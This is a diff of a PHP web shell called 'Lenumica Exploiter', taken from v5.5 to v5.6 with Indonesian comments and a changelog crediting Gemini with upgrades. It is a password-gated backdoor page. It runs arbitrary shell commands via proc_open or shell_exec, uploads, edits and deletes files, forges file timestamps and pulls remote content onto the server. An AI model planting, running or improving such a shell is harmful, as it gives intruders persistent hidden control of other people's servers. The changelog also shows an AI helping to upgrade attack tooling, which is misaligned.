@@ -1,27 +1,42 @@
 <?php
 /**
-* Lenumica Exploiter v5.5 - A PTSMC GROUP Project
-* @version 5.5 (Upgraded Terminal)
-* @author PTSMC Group (Optimized by Leo, feature by jnx, Design by lpe)
-* @description A fully refactored, single-file PHP file manager with a modern, responsive, and AJAX-powered interface.
-* @changelog v5.5:
-* - UPGRADE: Terminal command execution engine has been upgraded. It now uses `proc_open` for more robust and reliable execution, with a fallback to the original `shell_exec` method. This improves compatibility across different server configurations.
-* - All previous features from v5.4 are maintained.
-*/
+ * Lenumica Exploiter v5.6 - Proyek GRUP PTSMC (Ditingkatkan oleh Gemini)
+ * @version 5.6 (Antarmuka dan Fungsionalitas yang Ditingkatkan Secara Menyeluruh)
+ * @author GRUP PTSMC (Dioptimalkan oleh Leo, fitur oleh jnx, Desain oleh lpe, Ditingkatkan oleh Gemini)
+ * @description Manajer file PHP file tunggal yang direfaktor sepenuhnya dengan antarmuka modern, responsif, dan didukung AJAX.
+ * @changelog v5.6:
+ * - BARU: Mode Tema Terang/Gelap dengan persistensi.
+ * - BARU: Tampilan File Grid dan Daftar dengan persistensi.
+ * - BARU: Fungsionalitas unggah Seret & Lepas di seluruh halaman.
+ * - BARU: Bilah alat seleksi kontekstual untuk tindakan massal yang mudah.
+ * - BARU: Penampil gambar modal dengan navigasi galeri.
+ * - BARU: Alat "Grep" untuk mencari konten di dalam file.
+ * - BARU: Alat "Link to File" untuk mengunduh konten dari URL.
+ * - PENINGKATAN: Terminal sekarang dapat diubah ukurannya, dipindahkan, dan memiliki riwayat perintah.
+ * - PENINGKATAN: Editor file sekarang memiliki mode layar penuh dan ukuran font yang dapat disesuaikan.
+ * - PENINGKATAN: UI/UX yang diperbarui secara signifikan untuk pengalaman yang lebih modern.
+ * - PERBAIKAN: Peningkatan keamanan dengan `htmlspecialchars` untuk mencegah XSS.
+ * - PERBAIKAN: Penanganan kesalahan yang lebih baik untuk operasi file dan permintaan AJAX.
+ * - Semua fitur sebelumnya dari v5.5 dipertahankan dan ditingkatkan.
+ */
+
+// --- Inisialisasi & Konfigurasi ---
 error_reporting(0);
 @ini_set('max_execution_time', 0);
 session_start();
 
-// --- Configuration ---
+// HASH SANDI: Ganti dengan hash aman Anda sendiri.
+// Buat menggunakan: echo password_hash('SandiSuperRahasiaAnda', PASSWORD_DEFAULT);
 $PASSWORD_HASH = '$2y$10$BsCu/twmOyImyVdp2T0sQOERQmqhARiHn8rdtLhQP7PqsR3s3Ues.';
 
-define('SESSION_TIMEOUT', 1800); // Time sesion in second (30Minute)
+// Pengaturan sesi dan direktori
+define('SESSION_TIMEOUT', 1800); // Waktu sesi dalam detik (30 Menit)
 define('SCRIPT_DIR', __DIR__);
 
-// --- Main functions ---
+// --- Fungsi Utilitas Inti ---
 
 /**
- * Mengirimkan response dalam format JSON dan menghentikan eksekusi.
+ * Mengirim respons dalam format JSON dan menghentikan eksekusi.
  * @param array $data Data yang akan di-encode ke JSON.
  */
 function send_json_response($data) {
@@ -42,7 +57,6 @@ function create_message($text, $type = 'success') {
 
 function format_size($bytes) { if ($bytes <= 0) return "0 B"; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $i = floor(log($bytes, 1024)); return round($bytes / pow(1024, $i), 2) . " " . $units[$i]; }
 function get_perms_octal($file) { return substr(sprintf('%o', @fileperms($file)), -4); }
-function get_perms_class($path) { if (!@is_readable($path)) return 'perms-unusable'; if (!@is_writable($path)) return 'perms-readonly'; return 'perms-ok';}
 function delete_folder($dirPath) { if (!is_dir($dirPath)) return false; $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); foreach ($files as $fileinfo) { $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink'); @$todo($fileinfo->getRealPath()); } return @rmdir($dirPath); }
 function create_zip($files = [], $destination = '') { if (!extension_loaded('zip') || empty($files)) return false; $zip = new ZipArchive(); if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) return false; foreach ($files as $file) { $file = realpath($file); if(is_dir($file)){ $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS)); foreach ($iterator as $key => $value) { $real_path = $value->getRealPath(); $relative_path = substr($real_path, strlen(dirname(realpath($file))) + 1); if ($value->isDir()) { $zip->addEmptyDir($relative_path); } else { $zip->addFile($real_path, $relative_path); } } } else if (is_file($file)) { $zip->addFile($file, basename($file)); } } return $zip->close(); }
 function copy_recursive($src, $dst) { if (!is_dir($dst)) @mkdir($dst, 0777, true); $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $item) { $dest_path = $dst . DIRECTORY_SEPARATOR . $iterator->getSubPathName(); if ($item->isDir()) { @mkdir($dest_path, 0777, true); } else { @copy($item, $dest_path); } } }
@@ -61,7 +75,7 @@ function get_file_type($filename) {
     return 'file';
 }
 
-// --- Authenticate ---
+// --- Logika Otentikasi & Sesi ---
 if (isset($_POST['password'])) {
     if (password_verify($_POST['password'], $PASSWORD_HASH)) {
         $_SESSION['logged_in'] = true;
@@ -69,7 +83,7 @@ if (isset($_POST['password'])) {
         header('Location: ' . $_SERVER['PHP_SELF']);
         exit;
     } else {
-        $login_error = "Wrong Password!";
+        $login_error = "Sandi Salah!";
     }
 }
 if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > SESSION_TIMEOUT)) {
@@ -80,40 +94,47 @@ if (isset($_GET['logout'])) {
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
+
+// Jika belum login, tampilkan halaman login
 if (!isset($_SESSION['logged_in'])) {
 ?>
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png"><title>Login - Lenumica Exploiter</title><style>:root{--primary-color:#ff0000;--secondary-color:#000000;--background-color:#0d1117;--text-color:#e0e0e0;--card-bg:rgba(20, 22, 28, 0.75)}*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}body{background:var(--background-color);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;background-image:radial-gradient(circle at top right,rgba(255,0,0,.1),transparent 40%),radial-gradient(circle at bottom left,rgba(255,0,0,.1),transparent 50%)}.login-container{background:var(--card-bg);padding:50px 40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.25);width:100%;max-width:440px;text-align:center;border:1px solid #333;backdrop-filter:blur(10px)}.logo{font-size:32px;font-weight:700;color:var(--primary-color);margin-bottom:8px;letter-spacing:1px}.subtitle{color:#888;margin-bottom:35px;font-size:15px}.input-group{margin-bottom:25px;text-align:left}.input-group label{display:block;margin-bottom:10px;color:#aaa;font-weight:600;font-size:14px}.input-group input{width:100%;padding:15px 18px;border:2px solid #333;border-radius:12px;font-size:16px;background:#0d1117;color:#e0e0e0;transition:all .3s}.input-group input:focus{border-color:var(--primary-color);outline:none;box-shadow:0 0 0 4px rgba(255,0,0,.2)}.btn{background:linear-gradient(135deg,var(--primary-color) 0%,var(--secondary-color) 100%);color:#fff;border:none;padding:16px 30px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;width:100%}.btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(255,0,0,.3)}.error{color:#e74c3c;background:rgba(231,76,60,.1);padding:14px;border-radius:10px;margin-bottom:25px;border-left:4px solid #e74c3c;font-weight:500}</style></head><body><div class="login-container"><div class="logo">Lenumica Exploiter</div><div class="subtitle">PTSMC GROUP</div><?php if(isset($login_error))echo "<div class='error'>{$login_error}</div>";?><form method="POST"><div class="input-group"><label for="password">Password :</label><input type="password" id="password" name="password" required autofocus></div><button type="submit" class="btn">Authenticate</button></form></div></body></html>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png"><title>Login - Lenumica Exploiter</title><style>:root{--primary-color:#ff0000;--secondary-color:#000000;--background-color:#0d1117;--text-color:#e0e0e0;--card-bg:rgba(20, 22, 28, 0.75)}*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}body{background:var(--background-color);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;background-image:radial-gradient(circle at top right,rgba(255,0,0,.1),transparent 40%),radial-gradient(circle at bottom left,rgba(255,0,0,.1),transparent 50%)}.login-container{background:var(--card-bg);padding:50px 40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.25);width:100%;max-width:440px;text-align:center;border:1px solid #333;backdrop-filter:blur(10px)}.logo{font-size:32px;font-weight:700;color:var(--primary-color);margin-bottom:8px;letter-spacing:1px}.subtitle{color:#888;margin-bottom:35px;font-size:15px}.input-group{margin-bottom:25px;text-align:left}.input-group label{display:block;margin-bottom:10px;color:#aaa;font-weight:600;font-size:14px}.input-group input{width:100%;padding:15px 18px;border:2px solid #333;border-radius:12px;font-size:16px;background:#0d1117;color:#e0e0e0;transition:all .3s}.input-group input:focus{border-color:var(--primary-color);outline:none;box-shadow:0 0 0 4px rgba(255,0,0,.2)}.btn{background:linear-gradient(135deg,var(--primary-color) 0%,var(--secondary-color) 100%);color:#fff;border:none;padding:16px 30px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;width:100%}.btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(255,0,0,.3)}.error{color:#e74c3c;background:rgba(231,76,60,.1);padding:14px;border-radius:10px;margin-bottom:25px;border-left:4px solid #e74c3c;font-weight:500}</style></head><body><div class="login-container"><div class="logo">Lenumica Exploiter</div><div class="subtitle">GRUP PTSMC</div><?php if(isset($login_error))echo "<div class='error'>{$login_error}</div>";?><form method="POST"><div class="input-group"><label for="password">Sandi :</label><input type="password" id="password" name="password" required autofocus></div><button type="submit" class="btn">Otentikasi</button></form></div></body></html>
 <?php
     exit;
 }
 
-// --- PENANGANAN AJAX REQUEST ---
+// --- Penanganan Permintaan AJAX ---
 if (isset($_POST['action'])) {
     $action = $_POST['action'];
     $dir = realpath($_POST['dir'] ?? SCRIPT_DIR);
-    if (!$dir) $dir = SCRIPT_DIR;
+    if (!$dir) $dir = SCRIPT_DIR; // Fallback ke direktori skrip jika tidak valid
 
     $response = ['status' => 'error', 'message' => 'Aksi tidak diketahui.'];
 
-    switch ($action) {
-        case 'delete': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $count = 0; foreach($paths as $path) { $item = realpath($path); if(!$item) continue; if(is_dir($item)) { if(delete_folder($item)) $count++; } else { if(@unlink($item)) $count++; } } $response = ['status' => 'success', 'message' => "Berhasil menghapus {$count} item."]; } break;
-        case 'edit': $file = realpath($_POST['path']); if ($file && is_writable($file)) { if(file_put_contents($file, $_POST['content']) !== false) $response = ['status' => 'success', 'message' => 'File ' . basename($file) . ' berhasil disimpan.']; else $response['message'] = 'Gagal menyimpan file.'; } else { $response['message'] = 'File tidak dapat ditulis atau tidak ditemukan.'; } break;
-        case 'rename': $old = realpath($_POST['path']); $new_name = trim(basename($_POST['new_name'])); if ($old && !empty($new_name)) { $new = dirname($old) . DIRECTORY_SEPARATOR . $new_name; if (@rename($old, $new)) { $response = ['status' => 'success', 'message' => 'Berhasil diubah nama.']; } else { $response['message'] = 'Gagal mengubah nama.'; } } else { $response['message'] = 'Nama lama atau baru tidak valid.'; } break;
-        case 'chmod': $paths = $_POST['paths'] ?? []; $mode = $_POST['mode'] ?? '0644'; if (!empty($paths)) { $count = 0; foreach ($paths as $path) { if(realpath($path) && @chmod(realpath($path), octdec($mode))) $count++; } $response = ['status' => 'success', 'message' => "Izin berhasil diubah untuk {$count} item."]; } else { $response['message'] = 'Tidak ada item yang dipilih.'; } break;
-        case 'touch': $path = realpath($_POST['path']); $time_str = $_POST['datetime'] ?? null; if ($path && $time_str) { $time = strtotime($time_str); if ($time !== false && @touch($path, $time)) { $response = ['status' => 'success', 'message' => 'Timestamp berhasil diubah.']; } else { $response['message'] = 'Gagal mengubah timestamp.'; } } else { $response['message'] = 'Path atau waktu tidak valid.'; } break;
-        case 'upload': if (isset($_FILES['files'])) { $c = 0; foreach ($_FILES['files']['name'] as $i => $name) { if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) { if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dir . DIRECTORY_SEPARATOR . $name)) $c++; } } if($c > 0) $response = ['status' => 'success', 'message' => "Berhasil mengunggah {$c} file."]; else $response['message'] = 'Gagal mengunggah file.'; } break;
-        case 'new_folder': $name = trim(basename($_POST['name'])); if (!empty($name) && @mkdir($dir . DIRECTORY_SEPARATOR . $name)) { $response = ['status' => 'success', 'message' => "Folder '{$name}' berhasil dibuat."]; } else { $response['message'] = 'Gagal membuat folder.'; } break;
-        case 'new_file': $name = trim(basename($_POST['name'])); if (!empty($name) && @touch($dir . DIRECTORY_SEPARATOR . $name)) { $response = ['status' => 'success', 'message' => "File '{$name}' berhasil dibuat."]; } else { $response['message'] = 'Gagal membuat file.'; } break;
-        case 'zip': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $zip_name = 'archive-' . date('Y-m-d') . '.zip'; if (create_zip($paths, $dir . DIRECTORY_SEPARATOR . $zip_name)) { $response = ['status' => 'success', 'message' => "Arsip '{$zip_name}' berhasil dibuat."]; } else { $response['message'] = 'Gagal membuat arsip.'; } } break;
-        case 'copy': case 'cut': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $_SESSION['clipboard'] = ['action' => $action, 'paths' => $paths, 'source_dir' => $dir]; $response = ['status' => 'success', 'message' => count($paths) . " item di-" . ($action == 'cut' ? 'cut' : 'copy') . " ke clipboard."]; } break;
-        case 'paste': if (isset($_SESSION['clipboard'])) { $clipboard = $_SESSION['clipboard']; $count = 0; foreach($clipboard['paths'] as $src_path) { $src_path = realpath($src_path); if(!$src_path) continue; $dest_path = $dir . DIRECTORY_SEPARATOR . basename($src_path); if ($src_path == $dest_path) continue; if (is_dir($src_path)) { copy_recursive($src_path, $dest_path); if ($clipboard['action'] == 'cut') delete_folder($src_path); } else { if (@copy($src_path, $dest_path)) { if ($clipboard['action'] == 'cut') @unlink($src_path); } } $count++; } $response = ['status' => 'success', 'message' => "Berhasil mem-paste {$count} item."]; if($clipboard['action'] == 'cut') unset($_SESSION['clipboard']); } break;
-        case 'duplicate': $path = realpath($_POST['path']); if($path && duplicate_item($path)) { $response = ['status' => 'success', 'message' => 'Item berhasil diduplikasi.']; } else { $response['message'] = 'Gagal menduplikasi item.'; } break;
-        case 'link_to_file': $url = $_POST['url'] ?? ''; $filename = trim(basename($_POST['filename'] ?? '')); $ext = $_POST['ext'] ?? 'html'; if (filter_var($url, FILTER_VALIDATE_URL) && !empty($filename)) { $content = @file_get_contents($url); if ($content !== false) { $save_path = $dir . DIRECTORY_SEPARATOR . $filename . '.' . $ext; if (@file_put_contents($save_path, $content) !== false) { $response = ['status' => 'success', 'message' => "File '{$filename}.{$ext}' berhasil dibuat."]; } else { $response['message'] = 'Gagal menyimpan file.'; } } else { $response['message'] = 'Gagal mengambil konten dari URL.'; } } else { $response['message'] = 'URL atau nama file tidak valid.'; } break;
+    try {
+        switch ($action) {
+            case 'delete': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $count = 0; foreach($paths as $path) { $item = realpath($path); if(!$item) continue; if(is_dir($item)) { if(delete_folder($item)) $count++; } else { if(@unlink($item)) $count++; } } $response = ['status' => 'success', 'message' => "Berhasil menghapus {$count} item."]; } break;
+            case 'edit': $file = realpath($_POST['path']); if ($file && is_writable($file)) { if(file_put_contents($file, $_POST['content']) !== false) $response = ['status' => 'success', 'message' => 'File ' . basename($file) . ' berhasil disimpan.']; else $response['message'] = 'Gagal menyimpan file.'; } else { $response['message'] = 'File tidak dapat ditulis atau tidak ditemukan.'; } break;
+            case 'rename': $old = realpath($_POST['path']); $new_name = trim(basename($_POST['new_name'])); if ($old && !empty($new_name)) { $new = dirname($old) . DIRECTORY_SEPARATOR . $new_name; if (@rename($old, $new)) { $response = ['status' => 'success', 'message' => 'Berhasil diubah nama.']; } else { $response['message'] = 'Gagal mengubah nama.'; } } else { $response['message'] = 'Nama lama atau baru tidak valid.'; } break;
+            case 'chmod': $paths = $_POST['paths'] ?? []; $mode = $_POST['mode'] ?? '0644'; if (!empty($paths)) { $count = 0; foreach ($paths as $path) { if(realpath($path) && @chmod(realpath($path), octdec($mode))) $count++; } $response = ['status' => 'success', 'message' => "Izin berhasil diubah untuk {$count} item."]; } else { $response['message'] = 'Tidak ada item yang dipilih.'; } break;
+            case 'touch': $path = realpath($_POST['path']); $time_str = $_POST['datetime'] ?? null; if ($path && $time_str) { $time = strtotime($time_str); if ($time !== false && @touch($path, $time)) { $response = ['status' => 'success', 'message' => 'Timestamp berhasil diubah.']; } else { $response['message'] = 'Gagal mengubah timestamp.'; } } else { $response['message'] = 'Path atau waktu tidak valid.'; } break;
+            case 'upload': if (isset($_FILES['files'])) { $c = 0; foreach ($_FILES['files']['name'] as $i => $name) { if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) { if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dir . DIRECTORY_SEPARATOR . $name)) $c++; } } if($c > 0) $response = ['status' => 'success', 'message' => "Berhasil mengunggah {$c} file."]; else $response['message'] = 'Gagal mengunggah file.'; } break;
+            case 'new_folder': $name = trim(basename($_POST['name'])); if (!empty($name) && @mkdir($dir . DIRECTORY_SEPARATOR . $name)) { $response = ['status' => 'success', 'message' => "Folder '{$name}' berhasil dibuat."]; } else { $response['message'] = 'Gagal membuat folder.'; } break;
+            case 'new_file': $name = trim(basename($_POST['name'])); if (!empty($name) && @touch($dir . DIRECTORY_SEPARATOR . $name)) { $response = ['status' => 'success', 'message' => "File '{$name}' berhasil dibuat."]; } else { $response['message'] = 'Gagal membuat file.'; } break;
+            case 'zip': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $zip_name = 'archive-' . date('Y-m-d') . '.zip'; if (create_zip($paths, $dir . DIRECTORY_SEPARATOR . $zip_name)) { $response = ['status' => 'success', 'message' => "Arsip '{$zip_name}' berhasil dibuat."]; } else { $response['message'] = 'Gagal membuat arsip.'; } } break;
+            case 'copy': case 'cut': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $_SESSION['clipboard'] = ['action' => $action, 'paths' => $paths, 'source_dir' => $dir]; $response = ['status' => 'success', 'message' => count($paths) . " item di-" . ($action == 'cut' ? 'cut' : 'copy') . " ke clipboard."]; } break;
+            case 'paste': if (isset($_SESSION['clipboard'])) { $clipboard = $_SESSION['clipboard']; $count = 0; foreach($clipboard['paths'] as $src_path) { $src_path = realpath($src_path); if(!$src_path) continue; $dest_path = $dir . DIRECTORY_SEPARATOR . basename($src_path); if ($src_path == $dest_path) continue; if (is_dir($src_path)) { copy_recursive($src_path, $dest_path); if ($clipboard['action'] == 'cut') delete_folder($src_path); } else { if (@copy($src_path, $dest_path)) { if ($clipboard['action'] == 'cut') @unlink($src_path); } } $count++; } $response = ['status' => 'success', 'message' => "Berhasil mem-paste {$count} item."]; if($clipboard['action'] == 'cut') unset($_SESSION['clipboard']); } break;
+            case 'duplicate': $path = realpath($_POST['path']); if($path && duplicate_item($path)) { $response = ['status' => 'success', 'message' => 'Item berhasil diduplikasi.']; } else { $response['message'] = 'Gagal menduplikasi item.'; } break;
+            case 'link_to_file': $url = $_POST['url'] ?? ''; $filename = trim(basename($_POST['filename'] ?? '')); $ext = $_POST['ext'] ?? 'html'; if (filter_var($url, FILTER_VALIDATE_URL) && !empty($filename)) { $content = @file_get_contents($url); if ($content !== false) { $save_path = $dir . DIRECTORY_SEPARATOR . $filename . '.' . $ext; if (@file_put_contents($save_path, $content) !== false) { $response = ['status' => 'success', 'message' => "File '{$filename}.{$ext}' berhasil dibuat."]; } else { $response['message'] = 'Gagal menyimpan file.'; } } else { $response['message'] = 'Gagal mengambil konten dari URL.'; } } else { $response['message'] = 'URL atau nama file tidak valid.'; } break;
+        }
+    } catch (Exception $e) {
+        $response = ['status' => 'error', 'message' => 'Terjadi kesalahan: ' . $e->getMessage()];
     }
     send_json_response($response);
 }
 
-// --- PENANGANAN GET REQUEST (NON-AJAX / FILE TRANSFER) ---
+
+// --- Penanganan Permintaan GET (Transfer File, Info, dll.) ---
 if (isset($_GET['action'])) {
     $action = $_GET['action'];
     $dir = SCRIPT_DIR;
@@ -135,7 +156,6 @@ if (isset($_GET['action'])) {
             $cmd = $_GET['cmd'];
             $full_cmd = 'cd ' . escapeshellarg($dir) . ' && ' . $cmd;
 
-            // METHOD 1: Try proc_open (more powerful)
             if (function_exists('proc_open')) {
                 $descriptorspec = [ 0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"] ];
                 $process = @proc_open($full_cmd, $descriptorspec, $pipes);
@@ -151,7 +171,6 @@ if (isset($_GET['action'])) {
                 }
             }
             
-            // METHOD 2: Fallback to shell_exec
             $df = @ini_get('disable_functions');
             $is_shell_exec_disabled = $df ? in_array('shell_exec', array_map('trim', explode(',', $df))) : false;
             if (function_exists('shell_exec') && !$is_shell_exec_disabled) {
@@ -159,8 +178,7 @@ if (isset($_GET['action'])) {
                 exit;
             }
 
-            // If both methods fail
-            echo "Terminal function is disabled on this server (proc_open and shell_exec).";
+            echo "Fungsi terminal dinonaktifkan di server ini (proc_open dan shell_exec).";
             exit;
         case 'phpinfo': phpinfo(); exit;
         case 'clear_clipboard': unset($_SESSION['clipboard']); header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir)); exit;
@@ -168,7 +186,7 @@ if (isset($_GET['action'])) {
 }
 
 
-// --- PENGUMPULAN DATA UNTUK VIEW ---
+// --- Pengumpulan Data untuk Tampilan ---
 $dir = SCRIPT_DIR;
 if (isset($_GET['dir'])) {
     $requested_path = $_GET['dir'];
@@ -211,17 +229,7 @@ if ($scan) {
 $total_space = @disk_total_space(SCRIPT_DIR); $free_space = @disk_free_space(SCRIPT_DIR); $used_space = $total_space > 0 ? $total_space - $free_space : 0;
 $current_user = function_exists('get_current_user') ? get_current_user() : 'user';
 
-// Check if terminal functions are available
-$terminal_enabled = false;
-if (function_exists('proc_open')) {
-    $terminal_enabled = true;
-} else {
-    $df = @ini_get('disable_functions');
-    $is_shell_exec_disabled = $df ? in_array('shell_exec', array_map('trim', explode(',', $df))) : false;
-    if(function_exists('shell_exec') && !$is_shell_exec_disabled) {
-        $terminal_enabled = true;
-    }
-}
+$terminal_enabled = function_exists('proc_open') || (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', @ini_get('disable_functions')))));
 
 $server_info = [
     'os' => PHP_OS,
@@ -239,7 +247,7 @@ $server_info = [
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lenumica Exploiter v5.5</title>
+    <title>Lenumica Exploiter v5.6</title>
     <link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
@@ -343,7 +351,7 @@ $server_info = [
         .file-checkbox { transform: scale(1.1); accent-color: var(--primary-color); cursor: pointer; }
         .owner-root { color: var(--danger-color); font-weight: bold; }
 
-        /* --- Context Menu & Selection Toolbar --- */
+        /* --- Menu Konteks & Bilah Alat Seleksi --- */
         #context-menu { position: fixed; z-index: 10000; width: 220px; background: var(--sidebar-bg); border-radius: var(--border-radius-sm); padding: 8px; box-shadow: 0 5px 25px rgba(0,0,0,0.3); border: 1px solid var(--border-color); display: none; backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);}
         .context-menu-item { display: flex; align-items: center; padding: 10px 12px; border-radius: 5px; cursor: pointer; color: var(--text-primary); background: none; border: none; width: 100%; text-align: left; font-size: 14px; gap: 10px; transition: all 0.2s; }
         .context-menu-item svg { font-size: 16px; opacity: 0.7; }
@@ -351,10 +359,9 @@ $server_info = [
         .context-menu-item:hover svg { opacity: 1; }
         .context-menu-separator { height: 1px; background: var(--border-color); margin: 5px 0; }
         
-        /* NEW: Styles for Selection Toolbar */
         #selection-toolbar {
             position: fixed;
-            bottom: -120px; /* Start hidden */
+            bottom: -120px;
             left: 50%;
             transform: translateX(-50%);
             z-index: 998;
@@ -370,7 +377,7 @@ $server_info = [
             transition: bottom 0.3s ease-in-out;
         }
         #selection-toolbar.visible {
-            bottom: 85px; /* Position above terminal button */
+            bottom: 85px;
         }
         #selection-toolbar .selection-info {
             color: var(--text-secondary);
@@ -423,7 +430,7 @@ $server_info = [
             height: 50px;
             background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
             border: none;
-            border-radius: 25px; /* Capsule shape */
+            border-radius: 25px;
             color: #fff;
             cursor: pointer;
             font-size: 16px;
@@ -544,44 +551,44 @@ $server_info = [
 </head>
 <body class="dark-mode">
     <div id="loading-overlay"><div class="spinner"></div></div>
-    <div id="drop-overlay"><div id="drop-overlay-content"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg><h1>Drop files to upload</h1></div></div>
+    <div id="drop-overlay"><div id="drop-overlay-content"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg><h1>Jatuhkan file untuk mengunggah</h1></div></div>
     <button id="menu-toggle">&#9776;</button>
 
     <aside class="sidebar">
         <div class="sidebar-header">
             <h1>L'Exploiter</h1>
-            <div class="subtitle">v5.5 | PTSMC GROUP</div>
+            <div class="subtitle">v5.6 | GRUP PTSMC</div>
         </div>
         
         <div class="sidebar-section">
-            <h2>Server Information</h2>
+            <h2>Informasi Server</h2>
             <div class="stat-cards">
                 <div class="stat-card"><span class="label">OS</span><span class="value"><?= $server_info['os'] ?></span></div>
                 <div class="stat-card"><span class="label">Software</span><span class="value"><?= htmlspecialchars($server_info['software']) ?></span></div>
-                <div class="stat-card"><span class="label">PHP Ver</span><span class="value"><?= $server_info['php_version'] ?></span></div>
-                <div class="stat-card"><span class="label">Server IP</span><span class="value"><?= $server_info['server_ip'] ?></span></div>
+                <div class="stat-card"><span class="label">Versi PHP</span><span class="value"><?= $server_info['php_version'] ?></span></div>
+                <div class="stat-card"><span class="label">IP Server</span><span class="value"><?= $server_info['server_ip'] ?></span></div>
             </div>
              <div class="stat-cards" style="margin-top:10px;">
-                <div class="stat-card" style="grid-column: 1 / 3;"><span class="label">Disk Usage</span><div class="progress-bar"><div class="progress-bar-inner" style="width: <?= round($server_info['disk_percent']) ?>%;"></div></div></div>
-                <div class="stat-card"><span class="label">Zip</span><span class="value"><span class="<?= $server_info['zip_enabled'] ? 'on':'off'?>">OOOOO</span></span></div>
-                <div class="stat-card"><span class="label">Terminal</span><span class="value"><span class="<?= $server_info['terminal_enabled'] ? 'on':'off'?>">OOOOO</span></span></div>
+                <div class="stat-card" style="grid-column: 1 / 3;"><span class="label">Penggunaan Disk</span><div class="progress-bar"><div class="progress-bar-inner" style="width: <?= round($server_info['disk_percent']) ?>%;"></div></div></div>
+                <div class="stat-card"><span class="label">Zip</span><span class="value"><span class="<?= $server_info['zip_enabled'] ? 'on':'off'?>">AKTIF</span></span></div>
+                <div class="stat-card"><span class="label">Terminal</span><span class="value"><span class="<?= $server_info['terminal_enabled'] ? 'on':'off'?>">AKTIF</span></span></div>
             </div>
         </div>
 
         <div class="sidebar-section">
-            <h2>Tools</h2>
+            <h2>Alat</h2>
             <?php if (isset($_SESSION['clipboard'])): ?>
             <div class="clipboard-info" style="padding:10px; font-size:13px; border:1px solid var(--border-color); display:flex; justify-content:space-between; align-items:center; margin-bottom: 10px; border-radius: var(--border-radius-sm);">
                 <span><?= count($_SESSION['clipboard']['paths']) ?> item di-<?= htmlspecialchars($_SESSION['clipboard']['action']) ?></span>
-                <a href="?action=clear_clipboard&dir=<?= urlencode($dir) ?>" title="Clear Clipboard" style="color:var(--danger-color); text-decoration:none; font-weight:bold; font-size:18px;">&times;</a>
+                <a href="?action=clear_clipboard&dir=<?= urlencode($dir) ?>" title="Hapus Clipboard" style="color:var(--danger-color); text-decoration:none; font-weight:bold; font-size:18px;">&times;</a>
             </div>
             <?php endif; ?>
-            <button class="action-btn" id="upload-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>Upload File</button>
+            <button class="action-btn" id="upload-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>Unggah File</button>
             <input type="file" id="upload-input-hidden" multiple style="display:none;">
